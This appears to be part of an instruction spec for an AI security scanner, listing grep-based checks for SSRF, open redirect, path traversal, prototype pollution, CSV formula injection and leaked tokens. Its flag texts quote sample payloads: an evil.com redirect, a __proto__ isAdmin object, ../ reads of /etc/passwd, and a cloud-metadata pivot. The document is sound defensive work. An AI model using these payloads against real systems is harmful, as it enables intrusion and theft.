**v6.6 additions — code-grep checks for attack patterns Codex flagged in v6.5 review:**

- **SSRF in URL-fetch / proxy endpoints** (any project with fetch/axios/got/request and user-controlled URL inputs):
  - Find fetch-shaped calls: `rg -n "fetch\(|axios\.|got\(|request\(|new URL\(" --type=js --type=ts src api pages app 2>/dev/null`
  - Find user-input sources in the same files: `rg -n "req\.(body|query|params)|searchParams|url\s*=\s*req\." --type=js --type=ts src api pages app 2>/dev/null`
  - For each file that has BOTH a fetch call AND reads `req.body|req.query|req.params|searchParams.get('url'|'href'|'target')`: read the file and verify there's an allowlist or private-IP block (`172.16.|10.|192.168.|169.254.|127.|localhost`) BEFORE the fetch
  - If user URL flows into fetch without allowlist → flag `ssrf-user-url-fetch` severity critical. Text: "User-controlled URL ({req.body field} → fetch call at {file:line}) flows into network request without allowlist or private-IP block. Attacker can pivot to cloud metadata (169.254.169.254), localhost services, or internal RFC1918 ranges."
  - Fix: parse the URL, reject if `hostname` is in a private range, OR maintain an allowlist of permitted destination domains.
  - Note: live probes against deployed proxy routes are in STEP 1B.

- **Webhook replay protection** (extends the v6.5 Stripe webhook signature check):
  - For any file matching the webhook patterns from v6.5 (Stripe, GitHub, Resend, custom HMAC), additionally check for replay protection
  - Required patterns: timestamp tolerance check (e.g., `Math.abs(Date.now() - event.created * 1000) < 5 * 60 * 1000`, or Stripe's `tolerance` parameter to `constructEvent`), AND idempotency store (look for: `event.id`, `processed_events`, `idempotency_key`, unique constraint on event ID column, Redis SET NX)
  - If signature is verified but neither timestamp tolerance NOR idempotency store is present → flag `webhook-replay-unprotected` severity critical. Text: "Webhook handler at {path} verifies signature but doesn't reject replays. Attacker who captures a valid webhook (network logs, CDN logs, accidentally-shared inbox) can re-send it indefinitely to re-trigger charges, fulfillments, or state changes."
  - Fix: store each `event.id` in a unique-constrained table on first receipt; reject on duplicate. For Stripe specifically, pass `tolerance: 300` (5 min) to `constructEvent`.

- **Open redirect in auth/callback flows** (any project with redirect logic):
  - Grep: `rg -n "redirect\(|NextResponse\.redirect|res\.redirect|location\.href\s*=|window\.location\s*=" --type=js --type=ts src app pages api 2>/dev/null`
  - For each match, check if the redirect target derives from `req.query.next|redirect|returnTo|callbackUrl|continue|to|target` without an allowlist check
  - Required validation pattern: `new URL(target, APP_ORIGIN).origin === APP_ORIGIN`, OR a hard-coded `allowedRedirects.includes(target)`, OR `target.startsWith('/')` (relative-only)
  - If user-controlled redirect target with no validation → flag `open-redirect-unvalidated` severity critical. Text: "Redirect target at {file:line} derives from `{query-param}` without same-origin or allowlist validation. Attacker crafts `?next=https://evil.com` in a phishing email; post-login user lands on attacker's domain, tokens may leak via referer."
  - Fix: validate `new URL(target, request.url).origin === request.nextUrl.origin` before redirecting, or treat the param as relative-path-only.

- **Path traversal in file download / read endpoints** (any project with server-side file reads):
  - Find file-read calls: `rg -n "readFile\(|createReadStream\(|sendFile\(|res\.download\(|fs\.read|fs\.promises\.readFile" --type=js --type=ts src app pages api 2>/dev/null`
  - In the same file, check if the path argument derives from `req.query.path|filename|file|key|name` without `path.resolve` + base-dir prefix check
  - Required pattern: `const resolved = path.resolve(BASE_DIR, userInput); if (!resolved.startsWith(BASE_DIR)) throw new Error('forbidden')`
  - If user input flows into file read without canonicalization → flag `path-traversal-file-read` severity critical. Text: "User-controlled path ({req.query field} → file read at {file:line}) not canonicalized against a base directory. Attacker uses `../` or URL-encoded `%2e%2e%2f` to escape into server filesystem (read `/etc/passwd`, `.env`, SSH keys)."
  - Fix: always `path.resolve(BASE, userPath)` and verify the result `startsWith(BASE)` before opening.

- **Prototype pollution from untrusted object merge** (any project with deep-merge libraries):
  - Find merge calls: `rg -n "lodash\.merge|_\.merge|deepmerge|merge\(|extend\(|Object\.assign" --type=js --type=ts src app pages api 2>/dev/null`
  - In the same file, check if `req.body` or parsed JSON flows into the merge target
  - Required mitigation: explicit key denylist (`if (Object.keys(input).some(k => ['__proto__','prototype','constructor'].includes(k))) throw`), OR use of `Object.create(null)` as the target, OR a sanitizer like `lodash.mergeWith` with a customizer that blocks dangerous keys
  - If untrusted deep merge with no denylist → flag `prototype-pollution-merge` severity moderate. Text: "Deep merge at {file:line} blends `req.body` into a target object without blocking `__proto__` / `prototype` / `constructor` keys. Attacker injects `{\"__proto__\":{\"isAdmin\":true}}` to mutate the global Object prototype — affects all subsequent objects."
  - Fix: use `lodash.mergeWith(target, src, (a,b,k) => DANGEROUS.includes(k) ? a : undefined)`, OR validate input shape with Zod first, OR use `structuredClone` of a plain object before merging.

- **Auth-endpoint rate limiting** (specialization of v6.4's no-rate-limiting check):
  - Identify auth routes: `rg -nl "login|signin|signup|password.reset|forgot.password|otp|magic.link|verify.email|2fa|totp" --type=js --type=ts src/api app/api api pages/api 2>/dev/null`
  - For each auth-shaped route, check the handler for rate-limiting constructs: `rateLimit|ratelimit|upstash.*Ratelimit|@upstash/ratelimit|sliding.window|token.bucket|captcha|hcaptcha|recaptcha|turnstile`
  - If auth route has NO rate-limiting AND NO captcha → flag `auth-endpoint-no-rate-limit` severity moderate. Text: "Auth route {path} has no rate-limiting or captcha. Credential-stuffing attacker can try 10,000+ username/password combos with no friction. Especially dangerous if the route reveals timing/error differences between 'user exists' and 'user doesn't exist'."
  - Fix: wrap the handler in `@upstash/ratelimit` (sliding window, 5 attempts per IP per 15 min), OR add a Cloudflare Turnstile / hCaptcha challenge for unauthenticated requests, OR both.
  - Note: this is in addition to the broader `no-rate-limiting` check on all public API routes — auth routes are higher-priority because account takeover is the goal.

- **Supabase Edge Function secret sweep** (v6.9 addition; projects with a `supabase/functions/` directory):
  - Run `grep -rn "sk_live_\|sk_test_\|sk-ant-\|sk-proj-\|AIzaSy\|whsec_\|eyJhbGciOi" supabase/functions/ --include="*.ts" --include="*.js" 2>/dev/null`
  - Also check for inline service-role assignment: `grep -rn "SERVICE_ROLE[A-Z_]*\s*[:=]\s*['\"]" supabase/functions/ 2>/dev/null`
  - Edge Functions read secrets via `Deno.env.get(...)`; any literal key/token/JWT in function source is committed to version control and shipped in the deploy bundle
  - Flag each as `hardcoded-secrets` severity critical. Text: "Edge Function {path} hardcodes a {key type} — move to `supabase secrets set NAME` and read via `Deno.env.get('NAME')`." Refer to the credential by variable name or key type only — never quote any value characters in the flag text.
  - Count service_role references inside `supabase/functions/` toward the excess-service-role-surface file count.

- **Client-prefix env var misnaming** (v6.9 addition, narrowed in v7.0; Next.js and Vite projects):
  - Run `grep -rn "NEXT_PUBLIC_[A-Z0-9_]*\(SECRET\|SERVICE_ROLE\|PRIVATE\)\|VITE_[A-Z0-9_]*\(SECRET\|SERVICE_ROLE\|PRIVATE\)\|NEXT_PUBLIC_[A-Z0-9_]*_\(KEY\|TOKEN\)=\|VITE_[A-Z0-9_]*_\(KEY\|TOKEN\)=" .env .env.* src app pages lib --exclude-dir=node_modules 2>/dev/null`
  - These prefixes ship the value to the client bundle by framework convention. Flag CREDENTIAL-SHAPED names only: containing SECRET / SERVICE_ROLE / PRIVATE, or ending in _KEY / _TOKEN — plus any public-prefixed var whose VALUE is a credential rather than a URL or plain config. `NEXT_PUBLIC_ADMIN_URL` is fine; `VITE_STRIPE_SECRET_KEY` is compromised the moment the bundle builds. (Exception: `_KEY` names that are documented client-safe by design — Supabase anon key, Firebase web API key, Stripe publishable key — are fine when RLS/rules are enforced; check that instead of flagging the name.)
  - Flag as `env-exposure`. Severity critical if a value is assigned in a tracked file or the var is read in shipped client code; moderate if the name only appears in `.env.example`.
  - Fix: drop the public prefix, move the read to a server-only path (API route, server component, Edge Function), and rotate the value if a build ever shipped with it.

- **Swallowed-exception sweep** (v7.0 addition):
  - Empty catch blocks: `rg -n --multiline "catch\s*(\([^)]*\))?\s*\{\s*\}" --type=js --type=ts src app pages lib api components server 2>/dev/null`
  - Python: `rg -n --multiline "except[^\n]*:\n\s*(pass|return(\s+(None|False|\[\]|\{\}|0|''|\"\"))?\s*$)" --type=py 2>/dev/null` — `except: pass` AND bare-fallback returns (`except Exception: return None`) both swallow.
  - Then list all catch sites: `rg -n "catch\s*[\(\{]" --type=js --type=ts src app pages lib api components server 2>/dev/null` (same directory list as the empty-catch grep — server actions and request helpers commonly live in `components/` and `server/`) — for each hit, read the block body. It is SWALLOWED if it contains none of `console.`, `logger`, `log(`, `throw`, `reject`, `captureException`, `Sentry`, `res.status`, `toast`, `setError`. A `return` does NOT make a catch safe by itself: `return null` / `return undefined` / `return []` / `return {}` / `return false` with no logging converts the failure into a silent fallback and counts as swallowed. A return only counts as surfacing when it returns an error response or error-shaped result the caller actually handles (`return res.status(500)...`, `return { ok: false, error }`).
  - Flag as `swallowed-exception`. Severity moderate by default; **critical→P2 when the swallowed catch wraps an auth, payment, webhook, or data-write path** — a failed Stripe signature check or Firestore write that vanishes silently is an attack's best friend and a data-loss generator.
  - Text template: "catch block at {file:line} swallows errors silently — {what the surrounding code does}. Failures here {concrete consequence: e.g. 'mean an order can fail to persist with no log, no alert, and a 200 response'}."
  - Fix: log with context at minimum (`console.error('{operation} failed', err)`), surface to the caller where the result matters, rethrow where the caller has better context. An intentional ignore needs a comment saying why.
  - Do NOT flag: catch blocks that intentionally fall back with a comment, AbortError filtering, feature-detection try/catch around optional APIs.

- **Unbounded in-memory growth sweep** (v7.0 addition):
  - Module-level mutable collections (covers typed TS forms — `new Map<string, number>()`, `const cache: Record<string, Foo> = {}` — not just untyped declarations): `rg -n "^(const|let|var)\s+[A-Za-z_$][\w$]*(\s*:\s*[^=]+)?\s*=\s*(new (Map|Set)\b[^(]*\(|\[\]|\{\})" --type=js --type=ts src app pages lib api components server 2>/dev/null`
  - For each hit, check whether it's WRITTEN to from a request/event handler (`.set(`, `.add(`, `.push(`, `[key] =`) and whether ANY eviction path exists: `.delete(`, `.clear(`, `.shift(`/`.splice(`, a TTL/expiry check, an LRU lib, or a max-size guard.
  - Writes with no eviction → flag `unbounded-growth`. This is distinct from `serverless-memory-state` (state loss on cold start): on serverless, an unbounded collection still OOMs a warm instance under sustained traffic; on a long-running server (VPS, PM2, Railway) it's a slow memory leak that dies at 3am.
  - Severity moderate; **P2 when the collection is keyed by unbounded user input (per-IP, per-session, per-request-ID) on a long-running server** — an attacker can grow it deliberately.
  - Fix: bound it — `lru-cache` with `max`, a TTL sweep (`setInterval` purge), or move the state to Redis/Upstash/DB where it belongs.
  - Do NOT flag: collections populated once at module load from static data, build-time-only scripts, test files.

**v7.1 additions — multi-file authorization & protocol checks (semantic, not pure-grep):**

> These eleven checks each START with a grep to find candidate sites, but the flag decision requires READING the surrounding code and reasoning about dataflow across files — the grep only narrows where to look. A bare pattern match is never sufficient to flag. Each verdict must cite `{file:line}`. These were derived from a cross-vendor review (Claude + OpenAI Codex) and hand-verified against two real codebases before inclusion; the false-positive guards below are not optional — they are the reason these checks are trustworthy.

> **READ THIS BEFORE JUDGING — calibration found these checks were systematically defeated by an agent rationalizing real findings down to "safe."** Two failure modes, both forbidden here:
> 1. **Do not anchor on the project's own security self-description.** Ignore CLAUDE.md "Strengths" lines, prior-scan "strong posture" notes, and reassuring code comments when deciding fire/no-fire. Judge the CODE in front of you. Every miss in calibration happened in a codebase that asserts strong security — the assertion is not evidence of safety.
> 2. **Each check below names the EXACT misconception that produces a false negative (marked "⚠ RATIONALIZATION TRAP"). If your reason for NOT firing matches the trap, you are wrong — fire it.** "It's quote-wrapped," "the compare is timing-safe," "the partner API is trusted," "there's a CSRF cookie" are not exemptions. Only the listed structural guards exempt a finding. When the code matches the FLAG condition and your only counter-argument is a trap, FIRE and let the verify pass sort it out — a false positive is cheap; a missed cross-tenant write in the commercial app is not.
>
> **DECISION POLICY (this overrides your default judgment — apply it to every check below).** You are NOT deciding "is this exploitable?" or "does this seem safe?" — that framing is what fails. You are adjudicating a structural predicate. Once a check's FLAG condition is met by code you have read, the finding **fires unless you can cite specific lines that prove one of THAT check's listed exemptions.** Exactly three verdicts are permitted:
> - **CONFIRM (→ Active Flag):** flag condition met; no listed exemption proven in the code.
> - **CLEAR:** you cite the exact line(s) proving a listed exemption. A clear REQUIRES a citation — "probably handled by middleware/a library/the framework" without reading and citing that code is NOT a clear.
> - **WATCH-LIST (confidence < 0.8):** the structural shape is present but you could not fully trace the dataflow across files. "I couldn't prove the exploit," "I'm not sure," and "couldn't find the whole chain" all map HERE — never to silence.
>
> Two hard rules inside that policy: (a) **Absence of a guard is not presence of a guard.** If you cannot find the session-binding comparison, the host allowlist, or the neutralization in the code you read, it is NOT there — do not assume it exists elsewhere; fire or watch-list. (b) **A guard only counts if it is the LISTED exemption for that specific check.** A real-looking control that is not on the check's exemption list (a CSRF cookie for `unsigned-tenant-binding`, "first-party domain" for `external-redirect`, a role gate for `token-in-logs`) does NOT clear the finding, no matter how reassuring it looks.

- **Unsigned tenant binding** (`unsigned-tenant-binding`, critical, A01):
  - The sink that matters: a tenant/org/owner/role identifier that decides WHO a privileged or cross-tenant write applies to, sourced from client-controllable data that is NOT cryptographically bound to the authenticated session.
  - Find candidates: `rg -n "Buffer\.from\([^)]*base64|atob\(|JSON\.parse\(.*(state|token|payload)|jwt\.decode\(|state\s*=|\.org_id|orgId|tenant_id|tenantId" --type=js --type=ts api app pages lib supabase 2>/dev/null`
  - For each: trace where the identifier comes from. FLAG when an org/tenant/owner id is decoded from an **unsigned** source (base64 blob, OAuth `state` payload, a JWT whose signature is never verified, a cookie value) AND is then used to target a DB write/upsert/update — especially via a service-role/RLS-bypassing client.
  - Guard (do NOT flag): the id is read from `auth.session`/`auth.profile`/verified-JWT claims; OR the decoded id is checked equal to the session-derived id before the write (`if (statePayload.org_id !== auth.profile.org_id) reject`). A signed+verified state (HMAC) also passes.
  - ⚠ RATIONALIZATION TRAP: a CSRF-token-vs-cookie match (e.g. `savedCsrf === statePayload.csrf`) and "a valid session exists" do **NOT** satisfy the guard. The CSRF match only proves the same browser made both legs of the flow; "a session exists" only proves the caller is *some* logged-in user. Neither proves the decoded `org_id` belongs to *this* user. The guard is satisfied ONLY by comparing the tenant id itself against the session-derived tenant id (`statePayload.org_id === auth.profile.org_id`). If that exact comparison is absent, FIRE — even when a CSRF cookie and a session check are both present.
  - Text: "Write at {file:line} targets org/tenant `{var}` decoded from {unsigned source} with no binding to the authenticated session — any authenticated user can forge it to write into another tenant's rows. (A CSRF cookie / session-exists check is present but does not bind the tenant id to the user.)"
  - Fix: derive the tenant id from the session, or require the decoded id to equal the session id before the write. If a round-trip value must carry the id, sign it (HMAC) and verify on return.

- **OAuth state not verified** (`oauth-state-not-verified`, critical, A07):
  - Find OAuth callbacks: `rg -n "searchParams\.get\(['\"]code|req\.query\.code|exchangeCodeForSession|callback|oauth" -g '*.{js,jsx,ts,tsx}' api app pages 2>/dev/null`
  - For each callback that reads an authorization `code` and exchanges it: trace the FULL round trip. At authorize time, is a `state` value generated and stored (cookie, session, `sessionStorage`)? At callback time, is the returned `state` read AND compared against that stored value BEFORE the code is exchanged?
  - FLAG when the callback consumes `code` but never reads/compares `state` (CSRF on the OAuth flow).
  - LISTED EXEMPTIONS (any one clears it): (1) the flow is delegated wholly to a library that handles state internally — `supabase.auth.exchangeCodeForSession`, NextAuth/Auth.js, `passport`, `openid-client`, `@octokit/oauth-app` — and the app does not hand-roll the token POST; (2) state is compared via an indirect helper (`verifyState(req)`) — read the helper and cite it; (3) **a CSRF/nonce value embedded in the `state` is read back on callback and compared against a browser-bound value (an HttpOnly cookie set at authorize time, or a server/session-stored value)** — e.g. `state` carries `{ csrf }`, a `jd_oauth_state` HttpOnly cookie holds the same token, and the callback rejects on `cookie.csrf !== statePayload.csrf`. That IS valid OAuth-state CSRF protection — CLEAR it; do not insist on RFC-canonical "store the whole state server-side" shape.
  - Scope note (prevents a cross-check mistake): exemption (3) clears **only** `oauth-state-not-verified`. It does NOT clear `unsigned-tenant-binding` — a CSRF-nonce match proves the same browser made both legs; it says nothing about whether a tenant/org id ALSO carried in that same state belongs to the authenticated user. The two checks can reach opposite verdicts on the very same callback, and that is correct.
  - Text: "OAuth callback at {file:line} exchanges `code` without verifying `state` (no library delegation, no nonce-vs-stored-value comparison) — vulnerable to login-CSRF / code-injection."
  - Fix: read the returned `state`, compare to the value stored at authorize time, reject on mismatch, clear it after use.

- **OAuth PKCE missing — PUBLIC clients only** (`oauth-pkce-missing`, **P4 advisory**, A07):
  - For each hand-rolled OAuth authorize-URL builder + token exchange: does the authorize URL include `code_challenge`, and does the token POST send a `client_secret`?
  - FLAG (advisory) ONLY when there is NO `code_challenge` AND the token exchange sends **no client secret** (a true public client — SPA/mobile/native that cannot hold a secret). 
  - Guard (do NOT flag — this is the common case): the token exchange sends a `client_secret` / HTTP Basic client auth. Confidential server-side clients do not require PKCE; flagging them is noise. This guard is why the check is reliable — without it the class false-positives constantly.
  - Text (advisory): "Public OAuth client at {file:line} performs the code flow without PKCE (`code_challenge`) — add PKCE for defense against code interception."
  - Fix: generate a `code_verifier`/`code_challenge` pair, send the challenge on authorize and the verifier on exchange.

- **Static admin bearer** (`static-admin-bearer`, critical when it is the sole gate on privileged ops, A01):
  - Find: `rg -n "ADMIN_PASSWORD|ADMIN_SECRET|ADMIN_TOKEN|ADMIN_KEY|CRON_SECRET|x-admin|requireAdmin|process\.env\.[A-Z_]*(PASSWORD|SECRET|TOKEN)" --type=js --type=ts api app pages lib middleware* 2>/dev/null`
  - For each privileged/admin/cron route: is the ONLY authentication a comparison of a request header/param against a static env var (no user-bound session, no role claim)?
  - FLAG critical when a static-env compare is the sole gate on privileged operations (cross-tenant reads/writes, admin actions, cron jobs that mutate data). Sub-check: note whether the comparison is timing-unsafe (`===`, `Array.includes(token)`, `==`) rather than `crypto.timingSafeEqual` — call it out in the flag text.
  - Guard (do NOT flag): the static secret is defense-in-depth ON TOP of a real session/role check; OR it gates a genuinely non-sensitive endpoint (single-tenant, no data exposure, no state mutation — e.g. a health ping).
  - ⚠ RATIONALIZATION TRAP: "the compare uses `crypto.timingSafeEqual`, so it's fine" and "admin endpoints are an appropriate use case, so non-sensitive" are BOTH wrong. A timing-safe compare that is the *sole* gate still FIRES — the flaw is the shared static secret, not the comparison. And any route that reads or writes more than one tenant's data is NEVER "non-sensitive": cross-org reads (every customer's records/feedback/error-logs at one endpoint), admin consoles, and data-mutating crons all FIRE when a static env bearer is the only gate, regardless of timing-safety. Only a genuinely single-tenant, side-effect-free endpoint is exempt.
  - **SEVERITY BY CALLER MODEL (v7.5, BLOCKING).** The check above decides IF it fires. This
    decides HOW LOUD. Severity keys on **what the secret gates and who can reach it** — never on
    how the secret is compared. State which tier you applied and the evidence, in the flag text:

    | Tier | Condition | Severity |
    |---|---|---|
    | **Human-reachable or cross-tenant** | A browser/human can reach the route (it is in a public-paths list, linked from a UI, or has no session layer beneath it), **or** it reads/writes more than one tenant's data | **P1** |
    | **Machine-to-machine, consequential** | Caller is provably a platform cron or a specific server — not browser-reachable — but the route mutates state or returns data | **P2** |
    | **Machine-to-machine, inert** | Same, and the route neither mutates nor returns data (health ping, warmup) | **P3** |

    Rules for applying this:
    - **"Machine-only" needs evidence, not assumption.** Cite the platform cron declaration
      (`vercel.json` `crons`, a scheduler config), a platform-injected header check
      (`x-vercel-cron`), or the calling service. A route that merely *looks* internal because of
      its path is NOT machine-only. No evidence → treat as human-reachable (P1).
    - **A high-entropy secret does not lower the tier by itself.** It makes guessing infeasible;
      it does nothing about leak-and-replay, which is the actual threat, and nothing about the
      missing per-caller identity and audit trail.
    - Down-tiering to P2/P3 requires an **escalation tripwire** in the flag text: what change
      makes it P1 (e.g. "escalates to P1 if this route is ever linked from the admin UI").
    - The RATIONALIZATION TRAP above still governs whether it fires at all. This tier is applied
      AFTER the check fires — it is not a fourth exemption.

    **Why this exists.** Before v7.5 this category was flat-critical, so a VPS→Vercel cron with a
    high-entropy secret and an `/api/admin/*` route sitting in `PUBLIC_PATHS` that returns every
    customer's org, user and feedback records scored identically. On the 2026-07-30 cycle it fired
    P1 in six apps and the owner's own code review correctly rejected the severity on the
    machine-to-machine ones while confirming it on the human-reachable one. Same failure shape as
    the flat `npm-cve-high | P1` rule this version also fixes: a severity that describes the
    *mechanism* instead of the *exposure*.

  - Text: "Privileged route {file:line} is gated only by a static `{ENV_VAR}` bearer{, compared with a timing-unsafe `===`}. A single shared secret protects {what it gates}; if it leaks, all of it is exposed. No per-user admin identity or audit trail."
  - Fix: move to per-admin identity (OIDC/JWT with a role claim) or per-admin DB-stored API keys with audit logging; rotate the shared secret; use `crypto.timingSafeEqual` for any remaining secret compare.

- **CSV/spreadsheet formula injection** (`csv-formula-injection`, moderate, A03):
  - Find export builders: `rg -n "text/csv|\.csv|toCsv|exportCsv|papaparse|new Blob\(|xlsx|exceljs|join\(','\)|\.join\(\\\"," -g '*.{js,jsx,ts,tsx}' 2>/dev/null`
  - For each cell-construction path: do user-entered free-text fields (names, descriptions, notes, vendor, brand) flow into cells WITHOUT neutralizing a leading `=`, `+`, `-`, `@`, tab, or CR?
  - ⚠ RATIONALIZATION TRAP: cells wrapped in double quotes (`"${cell}"`) are NOT safe. Quoting and `""`-escaping stop a value from breaking the CSV into extra columns; they do NOTHING to stop Excel/Sheets from evaluating a leading `=`/`+`/`-`/`@` as a formula. If you are about to write "NO-FIRE because the cells are quoted," STOP — that is the trap. The ONLY valid neutralization is prefixing a leading-formula value with `'` or stripping/escaping the formula char itself. A literal cell like `=== USAGE SUMMARY ===` inside quotes is still live. When user free-text reaches a cell and the only defense is quoting, FIRE.
  - FLAG when user free-text reaches cells unneutralized (quoting does not count as neutralization).
  - Guard (do NOT flag): only numeric/enum/system-generated values are exported; OR cells are prefixed with `'` / the leading formula char is stripped/escaped.
  - Note escalation: org-scoped exports are same-tenant (moderate); if the app ever emails/shares an export across orgs, the same flaw is higher severity — mention it in the flag text.
  - Text: "CSV export at {file:line} writes user free-text (`{field}`) into cells without neutralizing leading `= + - @` — a crafted value like `=HYPERLINK(...)` executes when the file opens in Excel/Sheets."
  - Fix: prefix any cell whose value starts with `= + - @ \t \r` with a single quote: `const neutralize = v => /^[=+\-@\t\r]/.test(String(v)) ? "'" + v : v`.

- **Token / secret value in logs or responses** (`token-in-logs`, critical, A09):
  - Find: `rg -n "console\.(log|error|warn|info)\(|res\.(json|send)\(|return Response\.json\(|NextResponse\.json\(" --type=js --type=ts api app pages lib supabase server 2>/dev/null`
  - FLAG critical when an actual secret VALUE reaches a log OR an HTTP response: an `access_token`/`refresh_token`/`client_secret`/`api_key` variable, an `Authorization` header value, or a full token-bearing response/request object (`console.error('...', tokens)`, `console.log(req.headers)`). This includes any endpoint that RETURNS raw token values in its response body — a "debug token" route that responds with `{ access_token: ..., refresh_token: ... }` is a fire even if it is role-gated, because the values then live in browser history, proxy logs, and network captures.
  - Distinguish from `verbose-vendor-logging`: a *token variable or token-bearing object* → `token-in-logs` (critical). An *unbounded third-party error/response BODY string* with no token → `verbose-vendor-logging` (moderate). When a body might contain a token, flag the more severe `token-in-logs`.
  - Guard (do NOT flag): logs of error messages, status codes, ids, or explicitly redacted values.
  - ⚠ RATIONALIZATION TRAP: "it's only logged on an error path, the body probably has no token" and "the debug endpoint is owner-gated, so it's fine" are NOT exemptions. Returning or logging raw tokens fires regardless of how the path is reached.
  - Text: "{file:line} logs {what} — token/secret values persist in function/platform logs (Vercel, CloudWatch) readable by anyone with log access."
  - Fix: never log secret values; log a boolean/length/last-4 at most. Remove debug endpoints that return raw tokens.

- **Verbose third-party body logging** (`verbose-vendor-logging`, moderate, A09) — **PROVISIONAL (Watch List only)**:
  - Calibration note: this check wobbles run-to-run (CLEAR ↔ WATCH-LIST) because "is this bounded enough?" is a judgment call — emit to the **Watch List (confidence < 0.8)** only, never an Active Flag, until the hybrid candidate-generation script lands (see v7.1 calibration findings). It is a moderate logging-hygiene issue; surfacing for review is sufficient.
  - Distinct from `token-in-logs`: an unbounded `await response.text()` / response body / XML snippet from a third-party API logged wholesale — may contain PII, serials, signed URLs, or diagnostic data even when no auth token is present.
  - FLAG when an external API error/response body is logged without length bounding or redaction.
  - Guard (do NOT flag): the body is sliced to a small bound (`.slice(0, 200)`) or only a status/summary is logged.
  - Text: "{file:line} logs an unbounded third-party response body (`{var}`) — customer data / signed URLs may leak into logs."
  - Fix: slice to a short bound before logging; redact known-sensitive fields.

- **External redirect / link followed with credentials** (`external-redirect-fetch-unvalidated`, moderate, A10) — **PROVISIONAL (Watch List only)**:
  - Calibration note: across four rounds of prompt hardening this check still produced a false NEGATIVE — an agent cleared a real token-bearing HATEOAS follow by reasoning "trusted first-party / documented accepted design," the exact rationalization the guard forbids. Determining "is there an allowlist anywhere across these files / is the token actually attached by the shared client" is a cross-file dataflow question pure-prompt adjudication fudges. Until the hybrid candidate-generation script lands (the script finds the response-derived URL + the auth header + greps for any in-code allowlist, then the LLM only adjudicates the candidate), emit to the **Watch List (confidence < 0.8)** only — never an Active Flag, and never CLEAR on partner-trust. Surfacing every credentialed response-derived fetch for human review is the safe failure mode.
  - HATEOAS / pagination / redirect-following pattern: server-side `fetch`/`axios` to a URL taken from an EXTERNAL API response (a `Location` header, a `links[].uri`/`href`/`@nextLink` field, a `nextPage` URL) where the follow-up request carries an `Authorization`/bearer header and there is NO host allowlist check before the call.
  - Find: `rg -n "headers\.get\(['\"]location|\.links|nextLink|nextPage|rel.*next|href|\.uri\b" --type=js --type=ts api app pages lib supabase 2>/dev/null` then cross-reference with `fetch(`/`axios` calls that attach an auth header.
  - FLAG when a response-derived URL is fetched WITH a credential attached and no destination-host validation. The credential may be attached inline OR by a shared pre-authed client instance — check the client, not just the call site.
  - Guard (do NOT flag) — ONLY these two: (a) the follow-up request carries NO auth token (e.g. fetching a presigned S3 URL from a 307 `Location` with a bare `fetch`); OR (b) the destination host is validated against an in-code allowlist before the call.
  - ⚠ RATIONALIZATION TRAP: "the URL comes from a trusted first-party / partner API, so it's safe" is NOT an exemption — it is the mitigation argument, and it is exactly the thing this check exists to flag. The threat model IS a compromised, misconfigured, or MITM'd partner response returning an unexpected host while your code attaches the bearer token. "Trusted vendor" never exempts; only "no token attached" or "explicit host allowlist in the code" do. If a response-derived URL is fetched with a credential and there is no allowlist check in the source, FIRE (note "mitigated by partner trust" in the text if you like, but still fire).
  - Text: "{file:line} follows a URL from {external API}'s response with the bearer token attached and no host allowlist — if that API is compromised or returns an unexpected host, the token is sent to it (SSRF / token exfiltration)."
  - Fix: validate the URL's host against a known allowlist of the partner's domains before any credentialed follow-up; strip the auth header on cross-host follows.

- **RLS write-side coverage** (`rls-write-side-coverage`, moderate, A01) — **PROVISIONAL (Watch List only)**:
  - This check is NOT yet calibrated against a verified corpus — emit to the **Watch List (confidence < 0.8)**, never Active Flags, until a full cycle proves the FP rate.
  - Grep `supabase/migrations/` for `CREATE POLICY` statements. For each table, classify policies by command: `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `ALL`.
  - Candidate concern: a table that is written from client-reachable code paths (an API route uses the RLS-enforced client, not service-role, for an insert/update) but has only SELECT policies (or none) for the write commands — meaning writes rely entirely on default-deny or are silently failing.
  - Guard (do NOT flag, hence provisional): tables intentionally append-only or read-only; tables written ONLY via service-role/RPC (RLS doesn't apply); tables where default-deny is the intended posture and no write path exists. This requires table USAGE context, not migration text alone — do not flag from migrations in isolation.
  - Text (Watch List): "Table `{table}` has SELECT policies but no INSERT/UPDATE/DELETE policy while {write path} writes via the RLS-enforced client — verify writes are intended and not relying on accidental default-deny."

- **Mass assignment** (`mass-assignment`, moderate, A01/A04) — **PROVISIONAL (Watch List only)**:
  - Not yet calibrated — emit to the **Watch List (confidence < 0.8)** only.
  - Find: `rg -n "\.(insert|update|upsert|create)\(\s*(req\.body|\{\s*\.\.\.req\.body|body\)|\{\s*\.\.\.body)|Object\.assign\([^,]*,\s*req\.body|\.\.\.(req\.body|body)\b" --type=js --type=ts api app pages 2>/dev/null`
  - FLAG when `req.body` (or a wholesale spread/`Object.assign` of it) flows into a DB write without an explicit field **allowlist** — caller can set columns the handler never intended. Privileged/sensitive columns to weigh when judging impact: `role`, `is_admin`, `org_id`, `tenant_id`, `plan`, `price`, `balance`, `credits`, `verified`, `email_verified`, `status`.
  - Guard (do NOT flag): the body is validated by a schema that STRIPS unknown keys (Zod `.strict()`/`.parse`, Yup, an ORM-level column allowlist) and the result — not raw body — is written; OR fields are explicitly destructured and mapped. **Allowlist clears; a denylist does NOT** — code that merely deletes a few known-bad keys (`delete body.role`) is not an allowlist and still flags, because the next privileged column added to the schema won't be on the denylist.
  - Text (Watch List): "{file:line} writes `req.body` wholesale into {table} with no field allowlist — a caller can set unintended columns (privilege/tenant escalation)."

- **Trusted client header** (`trusted-client-header`, critical, A01) — **PROVISIONAL (Watch List only)**:
  - Not yet calibrated — emit to the **Watch List (confidence < 0.8)** only.
  - Find: `rg -n "req\.headers\[['\"]x-|headers\.get\(['\"]x-|x-org|x-user|x-tenant|x-role|x-admin" --type=js --type=ts api app pages lib middleware* 2>/dev/null`
  - FLAG when an authorization or tenant-scoping decision reads a client-supplied custom header (`x-org-id`, `x-user-id`, `x-role`) instead of the authenticated session.
  - Guard (do NOT flag): headers injected/verified by trusted infrastructure (a gateway/proxy that strips-then-sets them, a verified signed header); standard headers used for non-authz purposes (content negotiation, request IDs for tracing).
  - Text (Watch List): "{file:line} makes an authz/tenant decision from client header `{header}` — trivially forgeable; scope from the session instead."

**v7.2 — dependency supply-chain (npm manifest + registry):**

- **Dependency confusion** (`dependency-confusion`, moderate, A08) — **PROVISIONAL (Watch List only)**:
